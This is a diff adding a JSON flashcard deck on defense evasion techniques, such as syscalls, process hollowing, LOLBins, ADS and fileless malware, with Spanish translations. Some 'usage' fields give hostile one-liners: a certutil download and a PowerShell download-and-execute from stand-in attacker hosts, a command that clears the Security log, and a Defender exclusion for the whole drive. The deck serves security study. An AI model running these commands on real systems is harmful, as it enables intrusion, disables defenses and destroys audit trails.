@@ -1,0 +1,664 @@
+[
+  {
+    "id": "563fd3350c68d8aa",
+    "deck": "01_Cloud_and_Infrastructure::Cybersecurity::Red_Teaming::Defense_Evasion",
+    "template": "T1_Cloze",
+    "metadata": {
+      "difficulty": "intermediate",
+      "pillar": "01_Cloud_and_Infrastructure",
+      "tags": [
+        "security",
+        "defense_evasion"
+      ]
+    },
+    "content": {
+      "scenario": "Security: EDR Evasion 🛡️",
+      "text": "Attackers bypass EDR API hooking in user mode by performing {{c1::direct system calls}} (Syscalls) to transition to kernel mode directly, bypassing NTDLL.",
+      "explanation": "Endpoint Detection and Response (EDR) systems hook standard Windows API functions in user-mode `ntdll.dll` to monitor process behavior. By loading the raw assembly instructions for syscalls directly, malware can transition to kernel mode without executing hooked functions.",
+      "spanish": "Los atacantes evaden los ganchos de la API de EDR en modo de usuario realizando llamadas directas al sistema (Syscalls) para pasar al modo de núcleo directamente, evadiendo NTDLL.",
+      "usage": "Tools like <code>Syswhispers</code> are used to generate custom assembly headers and dynamic syscall stubs for evasion."
+    },
+    "mnemonics": {
+      "palace_name": "",
+      "locus_stop": "",
+      "mnemonic_scene": "",
+      "peg_word": "",
+      "phonetic_code": ""
+    },
+    "interactivity": {
+      "analogy": "",
+      "interactive_mermaid": "",
+      "match_game_data": null
+    }
+  },
+  {
+    "id": "a971d11766e5a76f",
+    "deck": "01_Cloud_and_Infrastructure::Cybersecurity::Red_Teaming::Defense_Evasion",
+    "template": "T1_Cloze",
+    "metadata": {
+      "difficulty": "intermediate",
+      "pillar": "01_Cloud_and_Infrastructure",
+      "tags": [
+        "security",
+        "defense_evasion",
+        "rca",
+        "malware"
+      ]
+    },
+    "content": {
+      "scenario": "Security: Evasion (Process Hollowing) 🛡️",
+      "text": "To execute covert code in a benign context, malware launches a system process in a suspended state, unmaps its memory, and writes a replacement payload; this is known as {{c1::Process Hollowing}}.",
+      "explanation": "Process hollowing evasion unmaps the original executable from a legitimate suspended process's memory space (e.g. svchost.exe) using NtUnmapViewOfSection, and injects a malicious payload into the hollowed section, updating the Thread Entry Point.",
+      "spanish": "Para ejecutar código encubierto en un contexto benigno, el malware inicia un proceso del sistema en estado suspendido, desasigna su memoria y escribe una carga útil de reemplazo; esto se conoce como vaciado de procesos (Process Hollowing).",
+      "usage": "**Symptom**: Unusually high CPU or network activity from a standard system process like svchost.exe.<br>**Root Cause**: Malicious payload executing inside a hollowed-out legitimate process container.<br>**Validation**: Run Sysinternals Process Hacker / Process Explorer and inspect the memory sections or parent-child hierarchy.<br>**Remediation**: Use EDR memory scanning for hollowed processes (detecting mismatch between file-on-disk and memory section headers)."
+    },
+    "mnemonics": {
+      "palace_name": "",
+      "locus_stop": "",
+      "mnemonic_scene": "",
+      "peg_word": "",
+      "phonetic_code": ""
+    },
+    "interactivity": {
+      "analogy": "",
+      "interactive_mermaid": "",
+      "match_game_data": null
+    }
+  },
+  {
+    "id": "291d173430a60209",
+    "deck": "01_Cloud_and_Infrastructure::Cybersecurity::Red_Teaming::Defense_Evasion",
+    "template": "T1_Cloze",
+    "metadata": {
+      "difficulty": "intermediate",
+      "pillar": "01_Cloud_and_Infrastructure",
+      "tags": [
+        "security",
+        "defense_evasion",
+        "code_snippet",
+        "api"
+      ]
+    },
+    "content": {
+      "scenario": "Security: Evasion (Parent PID Spoofing) 🛡️",
+      "text": "To evade parent-child process detection rules, malware spoofs its parent process by using the {{c1::UpdateProcThreadAttribute}} API to specify a different Parent PID.",
+      "explanation": "EDR and security agents monitor parent-child process relationships (e.g., cmd.exe spawned by word.exe is suspicious). Parent PID Spoofing leverages Windows thread execution attributes to assign a benign parent (like explorer.exe) to a newly created malicious process.",
+      "spanish": "Para evadir las reglas de detección de procesos padre-hijo, el malware suplanta su proceso padre utilizando la API UpdateProcThreadAttribute para especificar un PID padre diferente.",
+      "usage": "Example PowerShell/CLI attack pattern:<ul><li>Malware calls <code>InitializeProcThreadAttributeList</code></li><li>Updates attribute with <code>PROC_THREAD_ATTRIBUTE_PARENT_PROCESS</code></li><li>Creates process pointing to benign PPID</li></ul>"
+    },
+    "mnemonics": {
+      "palace_name": "",
+      "locus_stop": "",
+      "mnemonic_scene": "",
+      "peg_word": "",
+      "phonetic_code": ""
+    },
+    "interactivity": {
+      "analogy": "",
+      "interactive_mermaid": "",
+      "match_game_data": null
+    }
+  },
+  {
+    "id": "02eeb7e9e353e30c",
+    "deck": "01_Cloud_and_Infrastructure::Cybersecurity::Red_Teaming::Defense_Evasion",
+    "template": "T1_Cloze",
+    "metadata": {
+      "difficulty": "intermediate",
+      "pillar": "01_Cloud_and_Infrastructure",
+      "tags": [
+        "security",
+        "defense_evasion",
+        "mitre"
+      ]
+    },
+    "content": {
+      "scenario": "Defense Evasion: Definition 🛡️",
+      "text": "In security frameworks (like MITRE ATT&CK), the tactic used by adversaries to avoid detection by security controls, antivirus software, and logging systems during an intrusion is {{c1::Defense Evasion}}.",
+      "explanation": "Defense evasion covers dozens of techniques, including code obfuscation, process injection, clearing logs, and bypassing UAC.",
+      "spanish": "La táctica utilizada por los adversarios para evitar ser detectados por el software de seguridad y los sistemas de registro durante una intrusión se llama Defense Evasion.",
+      "usage": "Tactic ID: <code>TA0005 (MITRE ATT&CK Defense Evasion)</code>"
+    },
+    "mnemonics": {
+      "palace_name": "",
+      "locus_stop": "",
+      "mnemonic_scene": "",
+      "peg_word": "",
+      "phonetic_code": ""
+    },
+    "interactivity": {
+      "analogy": "",
+      "interactive_mermaid": "",
+      "match_game_data": null
+    }
+  },
+  {
+    "id": "ed62d96b34ee495a",
+    "deck": "01_Cloud_and_Infrastructure::Cybersecurity::Red_Teaming::Defense_Evasion",
+    "template": "T1_Cloze",
+    "metadata": {
+      "difficulty": "intermediate",
+      "pillar": "01_Cloud_and_Infrastructure",
+      "tags": [
+        "security",
+        "defense_evasion",
+        "obfuscation"
+      ]
+    },
+    "content": {
+      "scenario": "Defense Evasion: Code Alteration 🛡️",
+      "text": "The process of modifying code structure (e.g., via renaming variables, base64 encoding, or XOR encryption) to hide its actual logic without changing its execution result is {{c1::Obfuscation}}.",
+      "explanation": "Helps malware bypass static signature-based antivirus scanners, since the file signature is altered.",
+      "spanish": "El proceso de modificar la estructura del código para ocultar su lógica real sin cambiar el resultado de su ejecución se denomina ofuscación (Obfuscation).",
+      "usage": "Techniques: <code>XOR encoding, Base64 wrapping, string splitting</code>"
+    },
+    "mnemonics": {
+      "palace_name": "",
+      "locus_stop": "",
+      "mnemonic_scene": "",
+      "peg_word": "",
+      "phonetic_code": ""
+    },
+    "interactivity": {
+      "analogy": "",
+      "interactive_mermaid": "",
+      "match_game_data": null
+    }
+  },
+  {
+    "id": "e81a493c643d367c",
+    "deck": "01_Cloud_and_Infrastructure::Cybersecurity::Red_Teaming::Defense_Evasion",
+    "template": "T1_Cloze",
+    "metadata": {
+      "difficulty": "intermediate",
+      "pillar": "01_Cloud_and_Infrastructure",
+      "tags": [
+        "security",
+        "defense_evasion",
+        "lolbas"
+      ]
+    },
+    "content": {
+      "scenario": "Defense Evasion: Legitimate Tools 🛡️",
+      "text": "Adversaries who execute malicious code using legitimate, pre-installed administrative operating system utilities (like PowerShell or certutil) are performing a technique called {{c1::Living off the Land}} (LotL).",
+      "explanation": "Since administrative tools are trusted, their execution is less likely to trigger security alerts. Legitimate binaries used this way are called LOLBins.",
+      "spanish": "Los atacantes que ejecutan código malicioso utilizando utilidades administrativas legítimas preinstaladas en el sistema realizan la técnica Living off the Land.",
+      "usage": "LOLBin example: <code>certutil.exe -urlcache -f -split http://malware.com/payload.exe</code>"
+    },
+    "mnemonics": {
+      "palace_name": "",
+      "locus_stop": "",
+      "mnemonic_scene": "",
+      "peg_word": "",
+      "phonetic_code": ""
+    },
+    "interactivity": {
+      "analogy": "",
+      "interactive_mermaid": "",
+      "match_game_data": null
+    }
+  },
+  {
+    "id": "d676ad6712105307",
+    "deck": "01_Cloud_and_Infrastructure::Cybersecurity::Red_Teaming::Defense_Evasion",
+    "template": "T1_Cloze",
+    "metadata": {
+      "difficulty": "intermediate",
+      "pillar": "01_Cloud_and_Infrastructure",
+      "tags": [
+        "security",
+        "defense_evasion",
+        "process_injection"
+      ]
+    },
+    "content": {
+      "scenario": "Defense Evasion: Memory Manipulation 🛡️",
+      "text": "The technique where malware injects its own malicious code into the memory space of a running, legitimate system process (like svchost.exe or explorer.exe) is called {{c1::Process Injection}}.",
+      "explanation": "Process injection hides the malware under a trusted process, bypassing process-based endpoint monitoring.",
+      "spanish": "La técnica en la que el malware inyecta su código malicioso en el espacio de memoria de un proceso legítimo en ejecución se llama inyección de procesos (Process Injection).",
+      "usage": "Common API sequence: <code>OpenProcess -> VirtualAllocEx -> WriteProcessMemory -> CreateRemoteThread</code>"
+    },
+    "mnemonics": {
+      "palace_name": "",
+      "locus_stop": "",
+      "mnemonic_scene": "",
+      "peg_word": "",
+      "phonetic_code": ""
+    },
+    "interactivity": {
+      "analogy": "",
+      "interactive_mermaid": "",
+      "match_game_data": null
+    }
+  },
+  {
+    "id": "0e0797fe48ea842b",
+    "deck": "01_Cloud_and_Infrastructure::Cybersecurity::Red_Teaming::Defense_Evasion",
+    "template": "T1_Cloze",
+    "metadata": {
+      "difficulty": "intermediate",
+      "pillar": "01_Cloud_and_Infrastructure",
+      "tags": [
+        "security",
+        "defense_evasion",
+        "dll_hijacking"
+      ]
+    },
+    "content": {
+      "scenario": "Defense Evasion: DLL Hijacking 🛡️",
+      "text": "The execution technique where an attacker places a malicious DLL with a name identical to a required system library in a directory searched before the system folder is called {{c1::DLL Hijacking}} (or DLL Side-Loading).",
+      "explanation": "Applications often search for DLL dependencies in their current directory first. Placing the fake DLL there causes the application to run it automatically.",
+      "spanish": "La técnica donde un atacante coloca una DLL maliciosa con el mismo nombre que una biblioteca legítima en la ruta de búsqueda de la aplicación se llama DLL Hijacking.",
+      "usage": "Attack vector: <code>Abusing DLL search order path</code>"
+    },
+    "mnemonics": {
+      "palace_name": "",
+      "locus_stop": "",
+      "mnemonic_scene": "",
+      "peg_word": "",
+      "phonetic_code": ""
+    },
+    "interactivity": {
+      "analogy": "",
+      "interactive_mermaid": "",
+      "match_game_data": null
+    }
+  },
+  {
+    "id": "f84bec25f14cba46",
+    "deck": "01_Cloud_and_Infrastructure::Cybersecurity::Red_Teaming::Defense_Evasion",
+    "template": "T1_Cloze",
+    "metadata": {
+      "difficulty": "intermediate",
+      "pillar": "01_Cloud_and_Infrastructure",
+      "tags": [
+        "security",
+        "defense_evasion",
+        "logging"
+      ]
+    },
+    "content": {
+      "scenario": "Defense Evasion: Cover Up 🛡️",
+      "text": "After executing malicious commands on a Windows machine, attackers often execute commands to {{c1::clear event logs}} (e.g. using `wevtutil`) to remove audit trails.",
+      "explanation": "Clearing logs makes incident response and forensic investigation much more difficult, though the act of clearing logs itself is highly suspicious.",
+      "spanish": "Después de realizar acciones maliciosas, los atacantes suelen borrar los registros de eventos (Event Logs) de Windows para eliminar huellas de auditoría.",
+      "usage": "PowerShell command: <code>wevtutil cl Security</code> (clears the Security log)"
+    },
+    "mnemonics": {
+      "palace_name": "",
+      "locus_stop": "",
+      "mnemonic_scene": "",
+      "peg_word": "",
+      "phonetic_code": ""
+    },
+    "interactivity": {
+      "analogy": "",
+      "interactive_mermaid": "",
+      "match_game_data": null
+    }
+  },
+  {
+    "id": "c776aaeed0d5f197",
+    "deck": "01_Cloud_and_Infrastructure::Cybersecurity::Red_Teaming::Defense_Evasion",
+    "template": "T1_Cloze",
+    "metadata": {
+      "difficulty": "intermediate",
+      "pillar": "01_Cloud_and_Infrastructure",
+      "tags": [
+        "security",
+        "defense_evasion",
+        "antivirus"
+      ]
+    },
+    "content": {
+      "scenario": "Defense Evasion: Security Tools 🛡️",
+      "text": "To stop local monitoring, attackers try to disable or modify local host firewalls and antivirus protections, a technique known as {{c1::Impairing Defenses}}.",
+      "explanation": "Includes terminating endpoint detection and response (EDR) agents or adding exclusions to Windows Defender.",
+      "spanish": "Para detener el monitoreo, los atacantes intentan desactivar o dañar las defensas locales, técnica conocida como Impairing Defenses.",
+      "usage": "Defender exclusion command: <code>Add-MpPreference -ExclusionPath \"C:\\\"</code>"
+    },
+    "mnemonics": {
+      "palace_name": "",
+      "locus_stop": "",
+      "mnemonic_scene": "",
+      "peg_word": "",
+      "phonetic_code": ""
+    },
+    "interactivity": {
+      "analogy": "",
+      "interactive_mermaid": "",
+      "match_game_data": null
+    }
+  },
+  {
+    "id": "ae636cbbe5929906",
+    "deck": "01_Cloud_and_Infrastructure::Cybersecurity::Red_Teaming::Defense_Evasion",
+    "template": "T1_Cloze",
+    "metadata": {
+      "difficulty": "intermediate",
+      "pillar": "01_Cloud_and_Infrastructure",
+      "tags": [
+        "security",
+        "defense_evasion",
+        "uac_bypass"
+      ]
+    },
+    "content": {
+      "scenario": "Defense Evasion: Privilege Escalation 🛡️",
+      "text": "The process of exploiting system flaws or configurations to bypass Windows User Account Control prompts and run programs with elevated administrative privileges is {{c1::UAC Bypass}}.",
+      "explanation": "Allows programs to run silently as administrator without triggering the visual dialog pop-up that alerts users.",
+      "spanish": "El proceso de eludir las solicitudes de Control de Cuentas de Usuario (UAC) de Windows para ejecutar comandos como administrador se llama UAC Bypass.",
+      "usage": "Techniques: <code>Fodhelper registry abuse, eventvwr bypass</code>"
+    },
+    "mnemonics": {
+      "palace_name": "",
+      "locus_stop": "",
+      "mnemonic_scene": "",
+      "peg_word": "",
+      "phonetic_code": ""
+    },
+    "interactivity": {
+      "analogy": "",
+      "interactive_mermaid": "",
+      "match_game_data": null
+    }
+  },
+  {
+    "id": "4832b4e09433b76f",
+    "deck": "01_Cloud_and_Infrastructure::Cybersecurity::Red_Teaming::Defense_Evasion",
+    "template": "T1_Cloze",
+    "metadata": {
+      "difficulty": "intermediate",
+      "pillar": "01_Cloud_and_Infrastructure",
+      "tags": [
+        "security",
+        "defense_evasion",
+        "ntfs",
+        "ads"
+      ]
+    },
+    "content": {
+      "scenario": "Defense Evasion: NTFS Streams 🛡️",
+      "text": "In Windows NTFS filesystems, attackers can hide malicious payloads inside legitimate files without modifying the file size or behavior by using {{c1::Alternate Data Streams}} (ADS).",
+      "explanation": "ADS allows files to have multiple streams of data. Standard tools like Dir show only the default stream, hiding the second malicious stream.",
+      "spanish": "En Windows NTFS, los atacantes pueden ocultar archivos maliciosos dentro de archivos legítimos utilizando flujos de datos alternativos (Alternate Data Streams).",
+      "usage": "Write syntax: <code>type payload.exe > calc.exe:secret.exe</code> | Execute: <code>wmic process call create c:\\calc.exe:secret.exe</code>"
+    },
+    "mnemonics": {
+      "palace_name": "",
+      "locus_stop": "",
+      "mnemonic_scene": "",
+      "peg_word": "",
+      "phonetic_code": ""
+    },
+    "interactivity": {
+      "analogy": "",
+      "interactive_mermaid": "",
+      "match_game_data": null
+    }
+  },
+  {
+    "id": "253de155e42cfe46",
+    "deck": "01_Cloud_and_Infrastructure::Cybersecurity::Red_Teaming::Defense_Evasion",
+    "template": "T1_Cloze",
+    "metadata": {
+      "difficulty": "intermediate",
+      "pillar": "01_Cloud_and_Infrastructure",
+      "tags": [
+        "security",
+        "defense_evasion",
+        "rootkit"
+      ]
+    },
+    "content": {
+      "scenario": "Defense Evasion: Kernel control 🛡️",
+      "text": "A type of stealth malware that alters operating system files or modifies kernel memory to hide processes, files, and network connections from standard diagnostic tools is a {{c1::Rootkit}}.",
+      "explanation": "Rootkits operate at a low level (often ring 0 / kernel mode), intercepting system calls and filtering out the malware's own presence.",
+      "spanish": "Un tipo de malware sigiloso que altera archivos del sistema o memoria del kernel para ocultar procesos y conexiones se llama Rootkit.",
+      "usage": "Level: <code>Kernel-mode rootkits, User-mode rootkits</code>"
+    },
+    "mnemonics": {
+      "palace_name": "",
+      "locus_stop": "",
+      "mnemonic_scene": "",
+      "peg_word": "",
+      "phonetic_code": ""
+    },
+    "interactivity": {
+      "analogy": "",
+      "interactive_mermaid": "",
+      "match_game_data": null
+    }
+  },
+  {
+    "id": "1efdfb962b5fb1f7",
+    "deck": "01_Cloud_and_Infrastructure::Cybersecurity::Red_Teaming::Defense_Evasion",
+    "template": "T1_Cloze",
+    "metadata": {
+      "difficulty": "intermediate",
+      "pillar": "01_Cloud_and_Infrastructure",
+      "tags": [
+        "security",
+        "defense_evasion",
+        "steganography"
+      ]
+    },
+    "content": {
+      "scenario": "Defense Evasion: Hiding files 🛡️",
+      "text": "The practice of concealing malicious data, scripts, or payloads within standard, benign-looking files (like hiding a ZIP file inside a PNG image) is called {{c1::Steganography}}.",
+      "explanation": "Allows attackers to bypass network traffic filters that scan for binary files, since the transfer looks like a regular image download.",
+      "spanish": "La práctica de ocultar datos o scripts maliciosos dentro de archivos que parecen normales y benignos se llama esteganografía (Steganography).",
+      "usage": "Utility: <code>Steghide</code>"
+    },
+    "mnemonics": {
+      "palace_name": "",
+      "locus_stop": "",
+      "mnemonic_scene": "",
+      "peg_word": "",
+      "phonetic_code": ""
+    },
+    "interactivity": {
+      "analogy": "",
+      "interactive_mermaid": "",
+      "match_game_data": null
+    }
+  },
+  {
+    "id": "07d0f4f5e9e05ab6",
+    "deck": "01_Cloud_and_Infrastructure::Cybersecurity::Red_Teaming::Defense_Evasion",
+    "template": "T1_Cloze",
+    "metadata": {
+      "difficulty": "intermediate",
+      "pillar": "01_Cloud_and_Infrastructure",
+      "tags": [
+        "security",
+        "defense_evasion",
+        "forensics"
+      ]
+    },
+    "content": {
+      "scenario": "Defense Evasion: File Metadata 🛡️",
+      "text": "The technique where attackers modify the creation, modification, and access timestamps of a malicious file to match legitimate system files is called {{c1::Timestomping}}.",
+      "explanation": "Evades timeline analysis performed by digital forensics specialists looking for recently created files in system directories.",
+      "spanish": "La técnica en la que los atacantes modifican las marcas de tiempo (creación, modificación) de un archivo malicioso para imitar a los del sistema se llama Timestomping.",
+      "usage": "Forensic defense: <code>Timestomping bypasses basic MACE timestamp analysis.</code>"
+    },
+    "mnemonics": {
+      "palace_name": "",
+      "locus_stop": "",
+      "mnemonic_scene": "",
+      "peg_word": "",
+      "phonetic_code": ""
+    },
+    "interactivity": {
+      "analogy": "",
+      "interactive_mermaid": "",
+      "match_game_data": null
+    }
+  },
+  {
+    "id": "12f3cf94e95c4cb7",
+    "deck": "01_Cloud_and_Infrastructure::Cybersecurity::Red_Teaming::Defense_Evasion",
+    "template": "T1_Cloze",
+    "metadata": {
+      "difficulty": "intermediate",
+      "pillar": "01_Cloud_and_Infrastructure",
+      "tags": [
+        "security",
+        "defense_evasion",
+        "network"
+      ]
+    },
+    "content": {
+      "scenario": "Defense Evasion: Traffic Obfuscation 🛡️",
+      "text": "To hide the destination of command-and-control traffic, attackers use {{c1::Domain Fronting}}, which routes traffic through a major CDN host header, making it look like it's going to a trusted site (e.g. Gmail).",
+      "explanation": "The HTTP connection request points to a trusted CDN domain, but the internal HTTP 'Host' header points to the attacker's server.",
+      "spanish": "Para ocultar el destino del tráfico malicioso, los atacantes utilizan Domain Fronting, enrutando el tráfico a través del encabezado de host de un CDN confiable.",
+      "usage": "Mechanism: <code>CDNs route based on the HTTP Host header, bypassing IP filters.</code>"
+    },
+    "mnemonics": {
+      "palace_name": "",
+      "locus_stop": "",
+      "mnemonic_scene": "",
+      "peg_word": "",
+      "phonetic_code": ""
+    },
+    "interactivity": {
+      "analogy": "",
+      "interactive_mermaid": "",
+      "match_game_data": null
+    }
+  },
+  {
+    "id": "06e3101e827ceb65",
+    "deck": "01_Cloud_and_Infrastructure::Cybersecurity::Red_Teaming::Defense_Evasion",
+    "template": "T1_Cloze",
+    "metadata": {
+      "difficulty": "intermediate",
+      "pillar": "01_Cloud_and_Infrastructure",
+      "tags": [
+        "security",
+        "defense_evasion",
+        "signature"
+      ]
+    },
+    "content": {
+      "scenario": "Defense Evasion: Hash Evasion 🛡️",
+      "text": "To bypass security systems that flag files based on known blacklisted hashes, attackers change the hash of their malware without breaking functionality by adding dummy bytes, a technique called {{c1::Padding}}.",
+      "explanation": "Adding arbitrary empty bytes changes the MD5/SHA256 checksum of the file entirely, defeating static signature detection.",
+      "spanish": "Para eludir los bloqueos de firmas de hash conocidas, los atacantes agregan bytes de relleno (Padding) al final del archivo para alterar su firma digital.",
+      "usage": "Action: <code>Appending zeros or garbage bytes to the end of a payload.</code>"
+    },
+    "mnemonics": {
+      "palace_name": "",
+      "locus_stop": "",
+      "mnemonic_scene": "",
+      "peg_word": "",
+      "phonetic_code": ""
+    },
+    "interactivity": {
+      "analogy": "",
+      "interactive_mermaid": "",
+      "match_game_data": null
+    }
+  },
+  {
+    "id": "e66bccfcd5b578cb",
+    "deck": "01_Cloud_and_Infrastructure::Cybersecurity::Red_Teaming::Defense_Evasion",
+    "template": "T1_Cloze",
+    "metadata": {
+      "difficulty": "intermediate",
+      "pillar": "01_Cloud_and_Infrastructure",
+      "tags": [
+        "security",
+        "defense_evasion",
+        "sandbox"
+      ]
+    },
+    "content": {
+      "scenario": "Defense Evasion: Sandbox Evasion 🛡️",
+      "text": "Malware can detect if it is running inside an analysis sandbox by testing for user interaction (like mouse clicks) or delaying execution using sleep loops, techniques known as {{c1::Sandbox Evasion}}.",
+      "explanation": "Sandboxes run files for a short duration. Sleep loops run out the sandbox's timer before executing malicious behaviors.",
+      "spanish": "El malware puede detectar si está en un entorno de pruebas (sandbox) mediante retrasos de tiempo o buscando firmas de máquinas virtuales (Sandbox Evasion).",
+      "usage": "Technique: <code>Delaying execution, checking for virtualization keys in the registry.</code>"
+    },
+    "mnemonics": {
+      "palace_name": "",
+      "locus_stop": "",
+      "mnemonic_scene": "",
+      "peg_word": "",
+      "phonetic_code": ""
+    },
+    "interactivity": {
+      "analogy": "",
+      "interactive_mermaid": "",
+      "match_game_data": null
+    }
+  },
+  {
+    "id": "c77eb1a0ed891405",
+    "deck": "01_Cloud_and_Infrastructure::Cybersecurity::Red_Teaming::Defense_Evasion",
+    "template": "T1_Cloze",
+    "metadata": {
+      "difficulty": "intermediate",
+      "pillar": "01_Cloud_and_Infrastructure",
+      "tags": [
+        "security",
+        "defense_evasion",
+        "fileless"
+      ]
+    },
+    "content": {
+      "scenario": "Defense Evasion: Memory-only 🛡️",
+      "text": "To prevent writing files to the local hard drive (which can be scanned easily by antivirus), attackers load scripts directly in memory. This is called {{c1::Fileless Malware}} (or memory-only execution).",
+      "explanation": "Often leverages command execution via PowerShell or WMI, loading DLLs directly from network locations into memory.",
+      "spanish": "Para evitar escribir archivos en el disco local que puedan ser escaneados por antivirus, los atacantes cargan scripts en memoria, conocido como Fileless Malware.",
+      "usage": "Example: <code>iex (New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')</code>"
+    },
+    "mnemonics": {
+      "palace_name": "",
+      "locus_stop": "",
+      "mnemonic_scene": "",
+      "peg_word": "",
+      "phonetic_code": ""
+    },
+    "interactivity": {
+      "analogy": "",
+      "interactive_mermaid": "",
+      "match_game_data": null
+    }
+  },
+  {
+    "id": "b41379507e5f043a",
+    "deck": "01_Cloud_and_Infrastructure::Cybersecurity::Red_Teaming::Defense_Evasion",
+    "template": "T1_Cloze",
+    "metadata": {
+      "difficulty": "intermediate",
+      "pillar": "01_Cloud_and_Infrastructure",
+      "tags": [
+        "security",
+        "defense_evasion",
+        "process"
+      ]
+    },
+    "content": {
+      "scenario": "Defense Evasion: Process Hiding 🛡️",
+      "text": "To bypass process audits that monitor command-line arguments, malware performs {{c1::Process Argument Spoofing}} by writing fake arguments to the Process Environment Block (PEB) during process creation.",
+      "explanation": "This technique makes command-line scanners believe a benign command is running, while the actual process runs with different (malicious) arguments in memory.",
+      "spanish": "Para eludir auditorías que monitorean argumentos de línea de comandos, el malware realiza Process Argument Spoofing modificando el bloque de entorno de proceso (PEB).",
+      "usage": "Mechanism: <code>Create process in suspended state -> modify PEB -> resume execution</code>."
+    },
+    "mnemonics": {
+      "palace_name": "",
+      "locus_stop": "",
+      "mnemonic_scene": "",
+      "peg_word": "",
+      "phonetic_code": ""
+    },
+    "interactivity": {
+      "analogy": "",
+      "interactive_mermaid": "",
+      "match_game_data": null
+    }
+  }
+]
